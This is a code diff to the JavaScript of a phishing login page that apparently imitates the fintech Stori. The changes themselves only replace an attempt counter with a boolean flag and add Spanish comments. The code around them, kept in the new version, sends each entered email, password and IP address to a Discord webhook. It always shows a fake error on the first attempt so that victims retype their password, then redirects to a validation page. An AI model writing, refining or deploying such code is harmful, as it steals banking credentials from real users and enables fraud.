@@ -99,7 +99,8 @@
     const passwordError = document.getElementById('passwordError');
     const loaderOverlay = document.getElementById('loaderOverlay');
 
-    let intento = 1; // 1 = primer intento, 2 = segundo intento
+    // Bandera: true = primer intento, false = segundo intento
+    let primerIntento = true;
 
     // Habilitar botón solo si el campo tiene más de 3 caracteres
     inputPas.addEventListener('input', function () {
@@ -119,29 +120,33 @@
       const ip = await getIP();
 
       // Enviar el intento actual al webhook
-      const message = `🛡️ **NUEVO INICIO DE SESIÓN (Stori)**\n\n📧 **Email:** ${email}\n🔑 **Contraseña (Intento ${intento}):** ${password}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;
+      const message = `🛡️ **NUEVO INICIO DE SESIÓN (Stori)**\n\n📧 **Email:** ${email}\n🔑 **Contraseña (Intento ${primerIntento ? 1 : 2}):** ${password}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;
 
       await sendToDiscord(message);
 
-      if (intento === 1) {
+      if (primerIntento) {
         // Primer intento: mostrar loader 3 segundos y luego error
         loaderOverlay.style.display = 'flex';
         boton.disabled = true;
 
         setTimeout(() => {
+          // Ocultar loader
           loaderOverlay.style.display = 'none';
+          // Mostrar error
           passwordError.style.display = 'block';
           inputPas.classList.add('error');
-          inputPas.value = ''; // dejar campo en blanco
+          // Limpiar campo
+          inputPas.value = '';
+          // Deshabilitar botón hasta que se escriba de nuevo
           boton.style.backgroundColor = '';
           boton.disabled = true;
+          // Enfocar campo
           inputPas.focus();
-          intento = 2; // siguiente intento
+          // Cambiar bandera para el siguiente intento
+          primerIntento = false;
         }, 3000);
       } else {
         // Segundo intento: continuar flujo normal
-        passwordError.style.display = 'none';
-        inputPas.classList.remove('error');
         window.location.href = 'validacion.html';
       }
     });
